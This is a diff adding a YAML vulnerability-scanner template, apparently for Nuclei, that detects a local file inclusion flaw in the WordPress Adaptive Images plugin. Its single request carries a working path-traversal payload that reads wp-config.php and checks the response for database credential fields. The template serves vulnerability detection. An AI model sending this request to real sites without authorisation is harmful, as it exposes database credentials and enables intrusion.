@@ -1,0 +1,25 @@
+id: wordpress-ext-adaptive-images-lfi
+info:
+  name: Wordpress Ext Adaptive Images Local File Inclusion
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: lfi,wordpress
+  description: |
+    The Wordpress Ext Adaptive Images plugin is vulnerable to Local File Inclusion (LFI), allowing attackers to read sensitive files on the server.
+http:
+  - raw:
+      - |
+        GET /wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "DB_NAME"
+          - "DB_USER"
+          - "DB_PASSWORD"
+          - "DB_HOST"
